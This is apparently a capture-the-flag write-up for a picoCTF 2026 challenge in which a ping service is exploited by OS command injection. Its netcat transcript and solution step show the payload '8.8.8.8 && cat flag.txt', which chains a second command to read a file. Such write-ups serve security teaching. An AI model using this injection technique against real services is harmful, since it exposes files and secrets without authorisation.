# ping-cmd
Challenge Description:
> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

CTF: <b>picoCTF 2026</b>
<br>Points: <b>100</b>
<br>Difficulty: <b>Easy</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> The program uses a shell command behind the scenes.
</details>
<details>
<summary>Hint 2</summary>

> Sometimes, You can run more than one command at a time.
</details>

## Procedure
The service allows us to provide an input to a ping command. However, the input filters the input IP to only allow `8.8.8.8`.
```
$ nc mysterious-sea.picoctf.net 64206
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.68 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.59 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.590/9.634/9.679/0.044 ms
```

The service might be simply passing out input into a `system` call of some kind. We can try appending a second command using `&&`.
```
$ nc mysterious-sea.picoctf.net 64206
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 && cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=8.72 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=8.72 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.720/8.720/8.721/0.000 ms
hammy{u win - hammy}
```

## Solution
1. Input `8.8.8.8 && cat flag.txt`.
